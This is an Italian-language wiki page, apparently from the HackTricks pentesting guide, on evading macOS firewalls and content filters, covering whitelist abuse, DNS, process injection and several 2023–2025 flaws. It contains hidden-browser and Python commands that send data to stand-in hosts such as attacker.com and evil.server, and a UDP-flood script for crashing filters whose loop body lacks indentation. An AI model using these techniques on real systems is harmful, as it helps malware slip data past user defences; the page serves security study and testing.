# Bypassing i firewall su macOS

{{#include ../../banners/hacktricks-training.md}}

## Tecniche individuate

Le seguenti tecniche sono risultate funzionanti in alcune app firewall per macOS.

### Abusare dei nomi della whitelist

- Ad esempio, chiamare il malware con nomi di processi macOS noti come **`launchd`**

### Synthetic Click

- Se il firewall chiede l'autorizzazione all'utente, fare in modo che il malware **faccia clic su allow**

### **Usare binari firmati da Apple**

- Come **`curl`**, ma anche altri come **`whois`**

### Domini Apple noti

Il firewall potrebbe consentire le connessioni verso domini Apple noti come **`apple.com`** o **`icloud.com`**. Inoltre, iCloud potrebbe essere usato come C2.

### Bypass generico

Alcune idee da provare per bypassare i firewall

### Controllare il traffico consentito

Conoscere il traffico consentito aiuterà a identificare i domini potenzialmente presenti nella whitelist o quali applicazioni sono autorizzate ad accedervi
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusare del DNS

Le risoluzioni DNS vengono eseguite tramite l'applicazione firmata **`mdnsreponder`**, che probabilmente sarà autorizzata a contattare i server DNS.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Tramite le app Browser

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Se puoi **inject code into a process** autorizzato a connettersi a qualsiasi server, puoi bypassare le protezioni del firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilità recenti per il bypass del firewall di macOS (2023-2025)

### Bypass del filtro dei contenuti web (Screen Time) – **CVE-2024-44206**
Nel luglio 2024 Apple ha corretto un bug critico in Safari/WebKit che comprometteva il “Web content filter” a livello di sistema, utilizzato dai controlli parentali di Screen Time.
Un URI appositamente creato (ad esempio, con “://” sottoposto a double URL-encoding) non viene riconosciuto dall'ACL di Screen Time, ma viene accettato da WebKit; la richiesta viene quindi inviata senza filtraggio. Di conseguenza, qualsiasi processo in grado di aprire un URL (incluso codice sandboxed o unsigned) può raggiungere domini esplicitamente bloccati dall'utente o da un profilo MDM.<sup>[2]</sup>

Test pratico (su un sistema non patched):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug nell'ordinamento delle regole di Packet Filter (PF) nelle prime versioni di macOS 14 “Sonoma”
Durante il ciclo beta di macOS 14, Apple ha introdotto una regressione nel wrapper userspace intorno a **`pfctl`**.
Le regole aggiunte con la keyword `quick` (utilizzata da molti kill-switch VPN) venivano ignorate silenziosamente, causando leak di traffico anche quando la GUI della VPN/firewall indicava *blocked*. Il bug è stato confermato da diversi vendor VPN e corretto nella RC 2 (build 23A344).

Verifica rapida del leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abuso dei servizi helper firmati da Apple (legacy – pre-macOS 11.2)
Prima di macOS 11.2, **`ContentFilterExclusionList`** consentiva a circa 50 binari Apple, come **`nsurlsessiond`** e l'App Store, di bypassare tutti i socket-filter firewall implementati con il framework Network Extension (LuLu, Little Snitch, ecc.).
Il malware poteva semplicemente eseguire un processo escluso—or inject code al suo interno—and tunnel il proprio traffico attraverso il socket già autorizzato. Apple ha rimosso completamente l'exclusion list in macOS 11.2, ma la tecnica è ancora rilevante sui sistemi che non possono essere aggiornati.<sup>[3]</sup>

Esempio di proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH per eludere i filtri di dominio di Network Extension (macOS 12+)
NEFilter Packet/Data Providers si basano su SNI/ALPN del TLS ClientHello. Con **HTTP/3 over QUIC (UDP/443)** e **Encrypted Client Hello (ECH)**, l'SNI rimane crittografato, NetExt non può analizzare il flusso e le regole basate sul nome host spesso adottano un comportamento fail-open, consentendo al malware di raggiungere domini bloccati senza interagire con il DNS.<sup>[5]</sup>

PoC minimo:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Se QUIC/ECH è ancora abilitato, questo è un semplice percorso di hostname-filter evasion.

### Instabilità della Network Extension di macOS 15 “Sequoia” (2024–2025)
Le prime build 15.0/15.1 causano il crash dei filtri **Network Extension** di terze parti (LuLu, Little Snitch, Defender, SentinelOne, ecc.). Quando il filtro si riavvia, macOS rimuove le relative regole di flusso e molti prodotti adottano un comportamento fail-open. Inondare il filtro con migliaia di brevi flussi UDP (o forzare QUIC/ECH) può attivare ripetutamente il crash e lasciare una finestra per C2/exfil mentre la GUI continua a indicare che il firewall è in esecuzione.<sup>[4]</sup>

Riproduzione rapida (lab box sicuro):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Suggerimenti sugli strumenti per le versioni moderne di macOS

1. Ispeziona le regole PF attuali generate dai firewall con GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Elenca i binary che dispongono già dell’entitlement *outgoing-network* (utile per il piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registra programmaticamente il tuo content filter di Network Extension in Objective-C/Swift.
Un PoC rootless minimale che inoltra i pacchetti a un socket locale è disponibile nel source code di **LuLu** di Patrick Wardle.

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
